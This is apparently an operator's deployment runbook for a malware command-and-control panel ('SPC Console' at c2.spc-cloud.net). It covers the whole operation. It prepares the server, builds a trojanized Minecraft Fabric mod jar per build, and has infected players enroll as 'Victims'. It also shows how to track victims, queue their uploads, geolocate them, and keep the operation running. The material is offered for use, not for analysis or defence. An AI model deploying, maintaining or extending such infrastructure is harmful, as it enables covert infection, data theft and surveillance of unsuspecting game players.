# SPC Console — VPS deployment from zero

Target: Debian 12 or Ubuntu 22.04, 2 vCPU / 4 GB RAM / 40 GB disk, Docker 27+ and the
compose plugin. DNS `A`/`AAAA` for `c2.spc-cloud.net` must point at the VPS **before**
starting Caddy; Caddy requests the certificate on first boot and retries on failure.

No service other than Cloudflare DNS and an optional webhook is used.

## 1. Host preparation

```bash
apt update && apt -y upgrade
apt -y install ca-certificates curl gnupg ufw fail2ban
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
chmod a+r /etc/apt/keyrings/docker.asc
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian $(. /etc/os-release && echo $VERSION_CODENAME) stable" > /etc/apt/sources.list.d/docker.list
apt update && apt -y install docker-ce docker-ce-cli containerd.io docker-compose-plugin
ufw default deny incoming
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
systemctl enable --now fail2ban
```

Create an unprivileged deploy user, add it to `docker`, and work from `/opt/spc`.

## 2. Get the code

```bash
adduser --disabled-password --gecos "" spc
usermod -aG docker spc
su - spc
git clone <repo> /opt/spc
cd /opt/spc/console
```

## 3. Secrets

Nothing secret is committed. Generate once and keep offline copies:

```bash
mkdir -p secrets
openssl rand -base64 24 | tr -d '\n' > secrets/db_password
printf 'postgresql://spc:%s@db:5432/spc?schema=public' "$(cat secrets/db_password)" > secrets/database_url
openssl rand -base64 48 | tr -d '\n' > secrets/jwt_secret
openssl rand -base64 32 | tr -d '\n' > secrets/master_key
chmod 600 secrets/*
chown spc:spc secrets/*
```

Create `.env` from `.env.example` and fill:

```bash
cp .env.example .env
chmod 600 .env
```

Required values:

| Key | Value |
|---|---|
| `PUBLIC_URL` | `https://c2.spc-cloud.net` |
| `CORS_ORIGIN` | same |
| `JWT_SECRET` | `cat secrets/jwt_secret` |
| `MASTER_KEY` | `cat secrets/master_key` |
| `DATABASE_URL` | `cat secrets/database_url` |
| `ACME_EMAIL` | real operator address |
| `JAR_SOURCE_HOST` | absolute path to the built mod jar |

`MASTER_KEY` seals victim device tokens at rest. Losing it means every agent has to
re-enroll; leaking it exposes device tokens (but not build secrets).

## 4. Build the mod jar

On the build machine:

```bash
JAVA_HOME=/path/to/jdk21 ./gradlew build -x test
scp build/libs/fabric-sync-*.jar spc@vps:/opt/spc/console/fabric-sync.jar
```

The panel injects `serverpackcore/config.json` into that jar per build; the source
jar itself never carries a build secret.

## 5. Start

```bash
docker compose pull
docker compose build
docker compose up -d db redis
docker compose run --rm -e ROLE=seed -e SEED=1 api
docker compose up -d
docker compose ps
```

`SEED=1` prints the admin/operator/viewer passwords and TOTP secrets **once** to the
terminal. Store them in the password manager, then confirm the API is healthy:

```bash
curl -fsS https://c2.spc-cloud.net/api/console/health
```

The first browser login forces TOTP enrollment. `admin@spc.local` must change its
password from **Settings** immediately.

## 6. First build and victim

1. Sign in at `https://c2.spc-cloud.net`.
2. **Builds → new build**, set name/version/profile.
3. Copy the build token, press the hammer to compile.
4. Download the jar and place it in the client `mods/` folder together with Fabric
   Loader 0.20.1 and Fabric API 0.92.12+1.20.1.
5. The agent enrolls within 30 s of joining a world; it appears under **Victims**.

## 7. Operations

```bash
docker compose logs -f --tail=200 api
docker compose exec db psql -U spc -d spc -c 'select count(*) from "Victim";'
docker compose restart api worker
```

Backups (nightly, keep 14 daily + 8 weekly):

```bash
docker compose exec -T db pg_dump -U spc -Fc spc > /var/backups/spc-$(date +%F).dump
tar -C /var/lib/docker/volumes -czf /var/backups/spc-artifacts-$(date +%F).tgz \
  $(docker volume ls -q | grep -E 'artifacts|builds')
openssl enc -aes-256-gcm -pbkdf2 -iter 200000 -salt -in /var/backups/spc-$(date +%F).dump -out /var/backups/spc-$(date +%F).dump.enc
```

Test a restore quarterly on a throwaway host:

```bash
docker compose stop api worker
docker compose exec -T db dropdb -U spc spc && docker compose exec -T db createdb -U spc spc
cat backup.dump | docker compose exec -T db pg_restore -U spc -d spc --clean --if-exists
docker compose start api worker
```

## 8. Upgrades

```bash
git pull
docker compose build
docker compose run --rm api npx prisma migrate deploy
docker compose up -d
```

A migration always runs before the new API starts. Roll back by checking out the
previous tag and restoring the matching dump; the artifact key derives from build
secrets stored in the database, so old artifacts stay readable.

## 9. Secret rotation

```bash
# session secret: invalidates every console session at once
openssl rand -base64 48 | tr -d '\n' > secrets/jwt_secret
# database password: change in postgres, then in both secret files, then restart
docker compose exec db psql -U spc -c "alter user spc with password 'NEW'"
# build secret: create a new build and move the jar; old agents keep their old build_id
```

`MASTER_KEY` rotation requires re-sealing `Victim.deviceTokenEnc`; script it offline
with both keys and restart.

## 10. Troubleshooting

| Symptom | Check |
|---|---|
| Caddy keeps retrying TLS | DNS not propagated, ports 80/443 closed, rate limit at Let's Encrypt |
| login says `ip_not_allowlisted` | `IP_ALLOWLIST` CIDR, `X-Real-IP` reaching the API |
| victim never appears | jar has `serverpackcore/config.json`, clock skew < 5 min, token not revoked |
| uploads stay `queued` | worker container running and Redis reachable |
| map empty | GeoLite2 file at `GEOIP_DB`, victim IP not private |
| 502 on `/api` | API container unhealthy, `docker compose logs api` |
